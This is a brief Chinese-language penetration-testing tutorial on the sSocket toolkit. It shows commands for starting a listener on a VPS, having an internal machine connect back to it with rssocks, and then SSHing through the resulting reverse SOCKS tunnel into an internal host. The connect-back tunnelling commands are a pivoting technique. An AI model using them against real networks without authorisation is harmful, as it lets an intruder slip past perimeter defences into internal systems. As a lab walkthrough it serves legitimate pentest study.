## sSocket

一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。

[下载地址](https://sourceforge.net/projects/ssocks/)

![img](https://static.zhishibox.net/20210115/107772465.png)

先在vps 执行**rcsocket.exe –l 1088 –p 8888 –vv**, 监听1088端口

![img](https://static.zhishibox.net/20210115/102400849.png)

内网机器执行.**/rssocks –vv –s 192.168.30.103:8888(VPS)**

![img](https://static.zhishibox.net/20210115/106614461.png)

成功，则会看到会话建立

![img](https://static.zhishibox.net/20210115/109461146.png)

设置代理，让本机可以通过VPS的**1088**端口访问内网机器。

![img](https://static.zhishibox.net/20210115/108479418.png)

本机上 **ssh 192.168.43.136**内网主机

![img](https://static.zhishibox.net/20210115/108153030.png)

成功ssh到内网机器

![img](https://static.zhishibox.net/20210115/101268305.png)